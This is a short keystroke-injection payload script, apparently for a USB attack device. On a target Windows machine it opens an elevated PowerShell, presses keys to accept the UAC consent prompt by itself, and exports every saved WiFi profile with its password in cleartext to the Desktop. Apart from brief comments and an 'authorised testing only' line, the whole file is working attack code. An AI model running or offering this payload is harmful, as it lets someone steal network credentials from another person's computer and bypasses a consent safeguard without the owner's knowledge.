REM Export saved WiFi profiles with cleartext keys (netsh wlan export key=clear)
REM Recovers PSKs for IoT SSIDs the target machine has joined.
REM Requires elevation: this triggers a UAC prompt that must be accepted.
REM The LEFT + ENTER below selects "Yes" on the default UAC dialog.
REM Profiles are written as XML to the Desktop. Authorised testing only.

DEFAULTDELAY 120

DELAY 800
GUI r
DELAY 600
STRING powershell Start-Process powershell -Verb RunAs
ENTER
DELAY 2000
LEFT
ENTER
DELAY 1800

STRINGLN netsh wlan export profile key=clear folder="$env:USERPROFILE\Desktop"
STRINGLN exit
